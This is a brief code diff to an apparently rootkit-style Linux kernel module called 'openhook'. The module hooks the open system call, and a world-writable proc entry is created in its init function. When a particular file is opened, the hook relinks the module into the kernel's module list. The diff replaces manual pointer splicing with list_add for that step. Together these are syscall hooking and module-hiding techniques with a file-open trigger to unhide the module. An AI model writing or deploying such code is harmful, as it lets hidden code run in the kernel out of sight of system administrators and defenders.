@@ -31,11 +31,7 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
 		printk("connect\n");
-		modules_list = THIS_MODULE->list;
-		n->prev = (&modules_list);
-		p->next = (&modules_list);
-		(&modules_list)->next = n;
-		(&modules_list)->prev = p;
+		list_add(&THIS_MODULE->list, p); //add to procfs
 		return -1 ;
 	}
 	return orig_sys_open(filename, flags, mode) ;
@@ -110,7 +106,6 @@ int __init openhook_init(void) {
 	proc_create("openhook", S_IRUGO | S_IWUGO, NULL, &openhook_fops) ;
 	
   	modules_list = THIS_MODULE->list;
-	n = (&modules_list)->next;
 	p = (&modules_list)->prev;
 	pr_info("name    = %s\n", THIS_MODULE->name);
     	pr_info("version = %s\n", THIS_MODULE->version);
